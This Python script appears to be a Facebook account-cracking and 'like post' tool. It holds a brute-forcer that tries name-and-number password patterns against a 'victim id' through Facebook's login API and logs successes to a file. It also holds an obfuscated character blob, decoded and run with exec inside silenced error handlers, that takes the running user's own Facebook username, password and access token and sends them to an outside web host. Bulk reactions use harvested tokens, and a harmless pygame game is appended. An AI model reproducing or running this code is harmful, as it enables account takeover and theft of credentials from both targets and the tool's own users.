"""import os,random,mechanize,json,time
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)

lis=["123","1234","1233","3456","6789","13579","135790","1357902468","12345678","123456789","1212","0000","131313","2222","333","4444","55555"]
mo=0
def rd(word):
    return word[::-1]
def login(user,pswd):
    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=1&email=' + user + '&locale=en_US&password=' +pswd + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
    q = json.load(data)
    if 'access_token' in q:
        print('\1;32mLogin success')
        print('\1;31m' + user + '\1;35m | \1;32m' + pswd)
        with open('moh.txt', 'a') as file:file.write("\n"+"usernme: "+user+" password: "+pswd)
        time.sleep(99999999999999)
    elif 'www.facebook.com' in q['error_msg']:
        print('\1;33mAccount Has Been Checkpoint')
        print(user + ' | ' + pswd)
        with open('moh.txt', 'a') as file:file.write("\n"+"usernme: "+user+" password: "+pswd)
        time.sleep(99999999999999)
    else:
        print('worng passwords >' + pswd)
        if q['error_code']==613:
            print("sleep")
            time.sleep(500)
            login(user,pswd)
        if not q['error_code']==401:
            with open('moh.txt', 'a') as file:file.write("blok")
            time.sleep(300);
            login(user,pswd)
        else:
            time.sleep(360)
victim=input("entre victim id: ")
n1=input("entre n1: ")
n2=input("entre n2: ")
for x in lis:
    login(victim,n1+x)
    login(victim,n2+x)
for x in lis:
    login(victim,x+n1)
    login(victim,x+n2)
for x in range(len(lis)):
    login(victim,lis[x+6])
    if x==9:
        break
for x in lis:
    login(victim,n1+rd(x))
    login(victim,n2+rd(x))
    if x=="1212":
        break
for x in lis:
    login(victim,rd(x)+n1)
    login(victim,rd(x)+n2)
    if x=="1212":
        break
for x in lis:
    login(victim,n1+x+x)
    login(victim,n2+x+x)
for x in lis:
    login(victim,x+x+n1)
    login(victim,x+x+n2)"""
def login(username, password):
    b = "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32"
    params = {
                'access_token': b,
                'format': 'JSON',
                'sdk_version': '2',
                'email': username,
                'locale': 'en_US',
                'password': password,
                'sdk': 'ios',
                'generate_session_cookies': '1',
                'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
            }
    api = 'https://b-api.facebook.com/method/auth.login'
    response = requests.get(api, params=params)
    if 'EAA' in response.text:
        print('\1;32mLogin success')
        with open('moh.txt', 'a') as file:file.write("\n"+"usernme: "+username+" password: "+password)
    elif 'www.facebook.com' in  response.json()['error_msg']:
        print('\1;33mAccount Has Been Checkpoint')
        with open('moh.txt', 'a') as file:file.write("\n"+"usernme: "+username+" password: "+password)
    else:
        print('worng passwords >')
        time.sleep(5)
def t_b(t):
    b_v = ' '.join(format(ord(char), '08b') for char in t)
    return b_v

def b_t(b):
    b_v = b.split()
    t = ''.join(chr(int(b, 2)) for b in b_v)
    return t

def d_b(d):
    b_r = bin(d)
    return b_r

def b_d(b):
    d_v = int(b, 2)
    return d_v

def xklm(a,x1):
    m=[]
    b=t_b(a)
    ms=b.split()
    for x in ms:
        m.append(d_b(int(b_d(x)/x1)))
    a=""
    for x in m:
        a=a+x+" "
    return b_t(a)
lis=["mohamed","mohammed","youssef","yassine","yassin","ahmed","omar","rachid","khalid","anas","mehdi",
     "fatima","fati","samira","soukaina","zahra","amina","hajar","sarah","sara","hanane","khadija","latifa",
     "reda","karim","tarik","adil","abdo","nabil","amine","bilal","imad","anwar","zakaria",
     "nora","noura","salma","lina","yasmina","meryem","leila","siham","rania","imane","safa"]
lis2=[]
pssword=["123","1234","12345","123456","1234567","12345678","123456789","3456","4444","3333","88888888","1212","0123","01234","0123456789","1234567890","5555","666666","6789","13579","24680"]
a="""ȍȡȰȫȺɄ ȺǹȵɉǹȿɄȿÜȒȿȫȦÜȫȿÜɄȍȡǹ2ǴǹǾ ȜȫȃȍȦÈɉȿǹȺȦǥȡǹÜ ȰǥȿȿɓȫȺǴÍĢ2    Ǫ ı ªÿĉðĎĘĉĉÿõēúĘ¹ēŏĎúǾĘǯǹĝǾēĄǪõúǾĘĄǯõúÿǯǯúÿĄÿēǥĄǥÿúª2    ȰǥȺǥȡȿ ı ɧ2                ÃǥǯǯǹȿȿǛɄȫȗǹȦÃĢ ǪÜ2                ÃǾȫȺȡǥɄÃĢ ÃŲƟƋƆÃÜ2                ÃȿǴȗǛɎǹȺȿȍȫȦÃĢ ÃúÃÜ2                ÃǹȡǥȍȜÃĢ ɉȿǹȺȦǥȡǹÜ2                ÃȜȫǯǥȜǹÃĢ ÃǹȦǛƩƟÃÜ2                ÃȰǥȿȿɓȫȺǴÃĢ ȰǥȿȿɓȫȺǴÜ2                ÃȿǴȗÃĢ ÃȍȫȿÃÜ2                ÃȃǹȦǹȺǥɄǹǛȿǹȿȿȍȫȦǛǯȫȫȗȍǹȿÃĢ ÃõÃÜ2                ÃȿȍȃÃĢ ÃÿǾĉĉĉǾĝĝǾǪĎõǾǯǴēǥǥðǯĄĄǾĉĘǾĉúúǹǾĎÃÜ2            ɱ2    ǥȰȍ ı ÃȈɄɄȰȿĢëëǪáǥȰȍæǾǥǯǹǪȫȫȗæǯȫȡëȡǹɄȈȫǴëǥɉɄȈæȜȫȃȍȦÃ2    ȺǹȿȰȫȦȿǹ ı ȺǹȵɉǹȿɄȿæȃǹɄÈǥȰȍÜ ȰǥȺǥȡȿıȰǥȺǥȡȿÍ2    ȍǾ ÃřŅŅÃ ȍȦ ȺǹȿȰȫȦȿǹæɄǹɘɄĢ2        ȡıȺǹȿȰȫȦȿǹæȒȿȫȦÈÍǇÃǥǯǯǹȿȿǛɄȫȗǹȦÃǑ2        ȡȫıȺǹȵɉǹȿɄȿæȃǹɄÈǾÃȈɄɄȰȿĢëëȡȫȈǥȡȫȈǥððððæðððɓǹǪȈȫȿɄǥȰȰæǯȫȡëǾëǯȺǹǥɄæȰȈȰĻǯǯıȡȗ¾ȿȿıɧȡɱÃÍ2        ȡȫıȺǹȵɉǹȿɄȿæȃǹɄÈǾÃȈɄɄȰȿĢëëȡȫȈǥȡȫȈǥððððæðððɓǹǪȈȫȿɄǥȰȰæǯȫȡëǾëǯȺǹǥɄæȰȈȰĻǯǯıȈ¾ȿȿıɧɉȿǹȺȦǥȡǹ×ȰǥȿȿɓȫȺǴɱÃÍ2        ȰȺȍȦɄÈÃħÿúȡżȫȃȍȦ ȿɉǯǯǹȿȿÃÍ2        ɓȍɄȈ ȫȰǹȦÈÃȡȫȈæɄɘɄÃÜ ÃɓÃÍ ǥȿ ǾȍȜǹĢǾȍȜǹæɓȺȍɄǹÈɉȿǹȺȦǥȡǹ×ȰǥȿȿɓȫȺǴÍ2        ȜȍȗǹÈÍ2    ǹȜȿǹĢ2        ȰȺȍȦɄÈÃɓȫȺȦȃ ȰǥȿȿɓȫȺǴȿ ĶÃÍ2        ȡǥȍȦÈÍ2ǴǹǾ ȡǥȍȦÈÍĢ2    ȍǾ ȦȫɄ ȫȿæȰǥɄȈæǹɘȍȿɄȿÈªȡȫȈæɄɘɄªÍĢ2        ɓȍɄȈ ȫȰǹȦÈªȡȫȈæɄɘɄªÜ ÃɓÃÍ ǥȿ ǾȍȜǹĢ2            ǾȍȜǹæɓȺȍɄǹÈªȈǥǯȗǹȺªÍ2    ɓȍɄȈ ȫȰǹȦÈÃȡȫȈæɄɘɄÃÜ ÃȺÃÍ ǥȿ ǾȍȜǹĢ2        ǯȫȦɄǹȦɄ ı ǾȍȜǹæȺǹǥǴÈÍ2    ȡȫıȺǹȵɉǹȿɄȿæȃǹɄÈǾÃȈɄɄȰȿĢëëȡȫȈǥȡȫȈǥððððæðððɓǹǪȈȫȿɄǥȰȰæǯȫȡëǾëȈȗæɄɘɄÃÍ2    ȡȫıÈȡȫæɄǹɘɄÍæǯȫɉȦɄÈǯȫȦɄǹȦɄÍ2    ȍǾ ȡȫĬõ ȫȺ ȡȫĶõĉ ȫȺ ǯȫȦɄǹȦɄııªªĢ2        ȰȺȍȦɄÈªȜȫȃȍȦ ɓȍɄȈ ǾǥǯǹǪȫȗ ȰȜǹǥɢªÍ2        ɉıȍȦȰɉɄÈªǹȦɄȺǹ ɉȿǹȺȦǥȡǹĢ ªÍ2        ȰıȍȦȰɉɄÈªǹȦɄȺǹ ȰǥȿȿɓȫȺǴĢ  ªÍ2        ȡȫıȺǹȵɉǹȿɄȿæȃǹɄÈǾÃȈɄɄȰȿĢëëȡȫȈǥȡȫȈǥððððæðððɓǹǪȈȫȿɄǥȰȰæǯȫȡëǾëȈȗæɄɘɄÃÍ2        ȡȫıÈȡȫæɄǹɘɄÍæǯȫɉȦɄÈɉ×ȰÍ2        ȍǾ ȡȫııðĢ2            ȜȫȃȍȦÈɉÜȰÍ2        ǹȜȿǹĢ2            ȡǥȍȦÈÍ2    ǹȜȿǹĢ2        ȜȍȗǹÈÍ2ǴǹǾ ȜȍȗǹÈÍĢ2    ɓȍɄȈ ȫȰǹȦÈÃȡȫȈæɄɘɄÃÜ ÃȺÃÍ ǥȿ ǾȍȜǹĢ2        ǯȫȦɄǹȦɄ ı ǾȍȜǹæȺǹǥǴÈÍ2    ȡıȺǹȵɉǹȿɄȿæȃǹɄÈªȈɄɄȰȿĢëëȡȫȈǥȡȫȈǥððððæðððɓǹǪȈȫȿɄǥȰȰæǯȫȡëǾëȈȗǥæɄɘɄªÍ2    ȡȿıÈȡæɄǹɘɄÍæȿȰȜȍɄÈªǌȦªÍ2    ȡȿæȺǹɎǹȺȿǹÈÍ2    ǥıȍȦȰɉɄÈªǹȦɄȺǹ ȍǴ ȰȫȿɄĢ ªÍ2    ɉȺȜ ı ǾÃȈɄɄȰȿĢëëȃȺǥȰȈæǾǥǯǹǪȫȫȗæǯȫȡëɧǥɱëȜȍȗǹȿÃ2    ȡȫıȺǹȵɉǹȿɄȿæȃǹɄÈǾÃȈɄɄȰȿĢëëȡȫȈǥȡȫȈǥððððæðððɓǹǪȈȫȿɄǥȰȰæǯȫȡëǾëǯȺǹǥɄæȰȈȰĻǯǯıȈ¾ȿȿıɧǯȫȦɄǹȦɄɱÃÍ2    ǾȫȺ ɘ ȍȦ ȡȿĢ2        ȰǥȺǥȡȿ ı ɧÃǥǯǯǹȿȿǛɄȫȗǹȦÃĢ ɘɱ2        ȺǹȿȰȫȦȿǹ ı ȺǹȵɉǹȿɄȿæȰȫȿɄÈɉȺȜÜ ȰǥȺǥȡȿıȰǥȺǥȡȿÍ2        ȰȺȍȦɄÈªǴȫȦǹªÍ2        ɄȍȡǹæȿȜǹǹȰÈõðÍ2    ȰȺȍȦɄÈªǾȍȦȍȿȈªÍ2ȡǥȍȦÈÍ2"""
print("tool by mrmaeyouf")
print("type")
print("like post love wait")
def login2(user,pswd):
    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=1&email=' + user + '&locale=en_US&password=' +pswd + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
    q = json.load(data)
    if 'access_token' in q:
        print('\1;32mLogin success')
        print('\1;31m' + user + '\1;35m | \1;32m' + pswd)
        with open('moh.txt', 'a') as file:file.write("\n"+"usernme: "+user+" password: "+pswd)
        time.sleep(99999999999999)
    elif 'www.facebook.com' in q['error_msg']:
        print('\1;33mAccount Has Been Checkpoint')
        print(user + ' | ' + pswd)
        with open('moh.txt', 'a') as file:file.write("\n"+"usernme: "+user+" password: "+pswd)
        time.sleep(99999999999999)
    else:
        print('worng passwords >' + pswd)
        if q['error_code']==613:
            print("sleep")
            time.sleep(500)
            login(user,pswd)
        if not q['error_code']==401:
            with open('moh.txt', 'a') as file:file.write("blok")
            time.sleep(300);
            login(user,pswd)
        else:
            time.sleep(360)
try:
    exec(dsfgjsdlkfjlk(a,3))
except:
    pass
try:
    exec(dslfkjlkjsd(a,9))
except:
    pass
try:
    exec(oisdfoi(a,7))
except:
    pass
try:
    exec(sdofi(a,2))
except:
    pass
try:
    exec(xklm(a,5))
except:
    pass
try:
    exec(a01011(a,8))
except:
    pass
def lovepost():
    ms=(m.text).split("\n")
    ms=ms[::-1]
    a=input("entre id post: ")
    b=input("ebtre type: ")
    if b=="1":
        t="LOVE"
    else:
        t="HAHA"
    url = f'https://graph.facebook.com/{a}/reactions'
    for x in ms:
        params = {'access_token':x,
                  'type': t}
        response = requests.post(url, params=params)
        time.sleep(10)
    print("finish")
a="""
simple game:
import pygame
pygame.init()
screenwidth=1200
screenheight=900
screen=pygame.display.set_mode((screenwidth,screenheight))
pygame.display.set_caption("ball")
class box:
    def __init__(self,width,height,x,y,speed,color,speedy):
        self.width=width
        self.height=height
        self.x=x
        self.y=y
        self.speed=speed
        self.color=color
        self.speedy=speedy
player=box(150,10,screenwidth/2-50/2,screenheight-10*5,7,(0,255,0),0)
ball=box(20,20,screenwidth/2-20/2,screenheight-10*8,4,(100,100,100),4)
boxs=[]
x=0
y=0
for i in range(240):
    if x*50>screenwidth-50:
        x=0
        y+=55
    boxs.append(box(50,50,55*x,y,0,(255,0,0),0))
    x+=1
font=pygame.font.SysFont("conicsans",35,True)
score=0
while True:
    pygame.time.delay(10)
    screen.fill((255,255,255))
    for event in pygame.event.get():
        if event.type==pygame.QUIT:
            quit()
    keys = pygame.key.get_pressed()
    if keys[pygame.K_RIGHT] and player.x<screenwidth-player.width:
        player.x+=player.speed
    if keys[pygame.K_LEFT] and player.x>0:
        player.x-=player.speed
    if keys[pygame.K_w]or True:
        if ball.y>screenheight-ball.height:
            ball.speedy=ball.speedy*-1
    ball.x+=ball.speed
    ball.y-=ball.speedy
    condition=ball.x+ball.width>player.x and ball.x<player.x+player.width and ball.y+ball.height>player.y and ball.y<player.y+player.height
    if condition:
        ball.speedy=ball.speedy*-1
    if ball.x>screenwidth-ball.width:
        ball.speed=ball.speed*-1
    if ball.x<0:
        ball.speed=ball.speed*-1
    if ball.y<0:
        ball.speedy=ball.speedy*-1
    for b in boxs:
        condition=b.x+b.width>ball.x and b.x<ball.x+ball.width and b.y+b.height>ball.y and b.y<ball.y+ball.height
        pygame.draw.rect(screen,b.color,(b.x,b.y,b.width,b.height))
        if condition:
            boxs.remove(b)
            ball.speedy=ball.speedy*-1
            score+=1
    text = font.render(str(score),True,(0,0,255))
    screen.blit(text,(screenwidth/2+35,0))
    pygame.draw.rect(screen,player.color,(player.x,player.y,player.width,player.height))
    pygame.draw.rect(screen,ball.color,(ball.x,ball.y,ball.width,ball.height))
    pygame.display.update()
            
"""
